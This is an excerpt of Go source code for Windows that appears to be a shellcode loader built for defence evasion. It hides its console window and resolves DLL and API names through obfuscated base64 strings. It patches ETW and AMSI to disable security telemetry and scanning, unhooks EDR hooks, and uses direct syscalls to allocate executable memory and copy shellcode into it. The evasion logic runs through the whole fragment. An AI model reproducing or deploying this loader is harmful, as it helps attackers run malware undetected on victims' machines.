...
func Hide(show bool) {
	//GetConsoleWindow
	getWin := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc(cusBase64decode("VWpKV01GRXlPWFZqTWpseldsWmtjR0p0VW5aa2R6MDk="))
	//ShowWindow
	showWin := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2'})).NewProc(cusBase64decode("VlRKb2RtUXhaSEJpYlZKMlpIYzlQUT09"))
...
//WriteProcessMemory
var procWriteProcessMemory = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc(cusBase64decode("VmpOS2NHUkhWbEZqYlRscVdsaE9lbFJYVm5SaU0wbzE="))
...
var procEtwNotificationRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("VWxoU00xUnRPVEJoVjFwd1dUSkdNR0ZYT1hWVmJWWnVZVmhPTUZwWVNUMD0="))
var procEtwEventRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKVFdsZGtjR016VW14alp6MDk="))
var procEtwEventWriteFull = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBWV2pGaVIzYzk="))
var procEtwEventWrite = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBSUFQwPQ=="))
...
func main() {
	...
	patchETW()
	patchAMSI()
	time.Sleep(2823 * time.Millisecond)
	Version := Versionfunc()
	if Version == "10.0" {
		FullUnhook()
	}
	...
	var handle uint64
	var BaseA, ZeroBits, AllocType, newProtect uintptr
	handle = 0xffffffffffffffff
	regionsizep := len(ShellCode)
	RegionSize := uintptr(regionsizep)
	newProtect = 0x40
	AllocType = 0x3000
	ptr := cmds.NtAllocateVirtualMemory(allocSysid, handle, BaseA, ZeroBits, RegionSize, AllocType, newProtect, 0)
	buff := (*[1890000]byte)(unsafe.Pointer(ptr))
	for x, y := range []byte(ShellCode) {
		buff[x] = y
	}
